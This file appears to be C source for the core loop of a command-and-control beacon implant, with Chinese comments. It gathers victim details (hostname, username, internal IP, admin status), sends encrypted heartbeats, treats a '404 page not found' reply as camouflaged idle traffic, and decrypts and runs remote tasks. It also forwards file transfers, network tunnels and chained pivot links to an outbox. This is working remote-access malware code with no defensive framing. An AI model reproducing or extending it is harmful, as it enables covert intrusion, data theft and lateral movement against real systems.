#include "beacon_agent_internal.h"

/* 构建元数据载荷 */
ByteBuf AgentBuildMetadataPayload(const BeaconContext* ctx)
{
    ByteBuf p;

    BbInit(&p);
    BbString(&p, ctx->meta.os);
    BbString(&p, ctx->meta.arch);
    BbString(&p, ctx->meta.hostname);
    BbString(&p, ctx->meta.username);
    BbString(&p, ctx->meta.internal_ip);
    BbString(&p, ctx->meta.process_name);
    BbU32(&p, ctx->meta.pid);
    BbU8(&p, (UINT8)(ctx->meta.is_admin ? 1 : 0));
    BbU32(&p, ctx->meta.acp);
    BbU32(&p, (UINT32)(ctx->profile.sleep_ms / 1000));
    BbU32(&p, (UINT32)ctx->profile.jitter);

    return p;
}

/* 构建明文心跳 */
ByteBuf AgentBuildHeartbeatPlain(const BeaconContext* ctx)
{
    ByteBuf meta = AgentBuildMetadataPayload(ctx);
    ByteBuf p = PacketPackHeartbeat(ctx->beacon_id, ctx->session_key, sizeof(ctx->session_key), &meta);

    BbFree(&meta);
    return p;
}

/* 检查响应体是否为默认的 404 内容 */
static INT AgentIsNotFoundBody(const ByteBuf* b)
{
    static const CHAR text[] = "404 page not found";
    return b->len == sizeof(text) - 1 && memcmp(b->data, text, b->len) == 0;
}

/* 解密并分发任务 */
VOID AgentDispatchTasks(BeaconContext* ctx, const ByteBuf* encrypted_tasks)
{
    ByteBuf plain;
    Parser outer;

    if (!encrypted_tasks->len || AgentIsNotFoundBody(encrypted_tasks)) {
        return;
    }

    if (!CryptoDecryptTask(ctx->session_key, sizeof(ctx->session_key), encrypted_tasks, &plain)) {
        return;
    }

    ParserInit(&outer, plain.data, plain.len);

    while (ParserLeft(&outer) > 0 && !outer.error[0]) {
        ByteBuf task_block = ParserBytes(&outer);
        Parser task;
        UINT32 task_id;
        UINT32 command_id;
        ByteBuf payload;
        PacketList results;
        SIZE_T i;

        if (outer.error[0]) {
            BbFree(&task_block);
            break;
        }

        ParserInit(&task, task_block.data, task_block.len);
        task_id = ParserU32(&task);
        command_id = ParserU32(&task);
        payload = ParserBytes(&task);

        if (task.error[0]) {
            ByteBuf e = BbFromText(task.error);
            ByteBuf f = PacketMakeFinal(task_id, command_id, &e);
            OutboxEnqueue(&ctx->outbox, f);
            BbFree(&e);
            BbFree(&task_block);
            BbFree(&payload);
            continue;
        }

        results = CommandDispatch(ctx, task_id, command_id, &payload);

        for (i = 0; i < results.count; ++i) {
            if (results.items_are_final) {
                ByteBuf moved = results.items[i];
                BbInit(&results.items[i]);
                OutboxEnqueue(&ctx->outbox, moved);
            } else {
                ByteBuf f = PacketMakeFinal(task_id, command_id, &results.items[i]);
                OutboxEnqueue(&ctx->outbox, f);
            }
        }

        if (results.should_exit) {
            ctx->active = 0;
        }

        PlistFree(&results);
        BbFree(&task_block);
        BbFree(&payload);
    }

    BbFree(&plain);
}

/* 轮询文件传输结果 */
VOID AgentFlushTransfers(BeaconContext* ctx)
{
    PacketList out = TransferPoll(ctx);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/* 轮询隧道数据 */
VOID AgentFlushTunnels(BeaconContext* ctx)
{
    PacketList out = TunnelPoll(&ctx->tunnels);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/* 轮询级联子链路数据 */
VOID AgentFlushCascade(BeaconContext* ctx)
{
    PacketList out = CascadePoll(&ctx->cascade);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}
